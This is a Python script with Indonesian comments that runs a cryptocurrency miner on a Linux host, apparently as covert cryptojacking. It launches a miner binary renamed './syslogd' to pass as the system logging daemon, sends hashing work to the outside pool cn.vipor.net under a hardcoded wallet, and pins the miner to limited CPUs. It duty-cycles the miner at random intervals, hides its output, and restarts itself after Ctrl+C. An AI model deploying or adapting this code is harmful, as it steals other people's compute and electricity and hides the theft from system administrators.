import os
import subprocess
import time
import random
import signal
import sys

def get_numa_info():
    """Mengambil informasi NUMA node dan CPU yang tersedia"""
    try:
        result = subprocess.run(["numactl", "--hardware"], capture_output=True, text=True)
        lines = result.stdout.split("\n")
        numa_info = {}

        for line in lines:
            if "node" in line and "cpus" in line:
                parts = line.split()
                node_id = int(parts[1])
                cpu_list = [int(cpu) for cpu in parts[3:]]
                numa_info[node_id] = cpu_list
        
        return numa_info
    except Exception as e:
        print(f"Error mendapatkan info NUMA: {e}")
        return {}

def stop_mining():
    """Menghentikan semua proses mining"""
    try:
        subprocess.run("pkill -f syslogd", shell=True)
        print("Semua proses mining telah dihentikan.")
    except Exception as e:
        print(f"Gagal menghentikan mining: {e}")

def start_mining(numa_node=0, limit_percent=80, initial_threads=1):
    """Menjalankan proses mining dengan NUMA terbatas"""
    numa_info = get_numa_info()
    
    if numa_node not in numa_info:
        print(f"NUMA node {numa_node} tidak ditemukan!")
        return
    
    total_cpus = len(numa_info[numa_node])
    limited_cpus = max(1, int((limit_percent / 100) * total_cpus))
    selected_cpus = ",".join(map(str, numa_info[numa_node][:limited_cpus]))
    
    threads = initial_threads
    max_threads = total_cpus  # Batasi jumlah maksimum thread sesuai dengan jumlah CPU yang tersedia
    
    while True:
        try:
            while threads <= max_threads:
                command = f"./syslogd -a verushash -o stratum+tcp://cn.vipor.net:5040 -u RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim.pmryn-srg -p x t {threads}"
                
                print(f"Menjalankan mining dengan {threads} thread")
                
                mining_process = subprocess.Popen(
                    f"numactl --cpunodebind={numa_node} --membind={numa_node} taskset -c {selected_cpus} {command} > /dev/null 2>&1",
                    shell=True
                )
                
                sleep_time = random.randint(55, 60)
                time.sleep(sleep_time)
                
                print(f"Mining dihentikan selama {sleep_time} detik.")
                stop_mining()
                
                time.sleep(10)
                
                threads += 1  # Tambah jumlah thread setiap kali mining dihentikan
            
            threads = initial_threads  # Reset jumlah thread setelah mencapai maksimum
        except KeyboardInterrupt:
            print("CTRL+C otomatis ditekan! Menghentikan semua proses mining dan restart...")
            stop_mining()
            time.sleep(5)
            print("Restarting mining...")
            continue

def signal_handler(sig, frame):
    print("CTRL+C ditekan! Menghentikan semua proses mining...")
    stop_mining()
    sys.exit(0)

# Tangani sinyal SIGINT untuk menangkap CTRL+C
signal.signal(signal.SIGINT, signal_handler)

# Jalankan mining dengan auto-restart jika terjadi stop
while True:
    try:
        start_mining(numa_node=0, limit_percent=80, initial_threads=1)
    except Exception as e:
        print(f"Terjadi kesalahan: {e}, restart mining dalam 5 detik...")
        time.sleep(5)
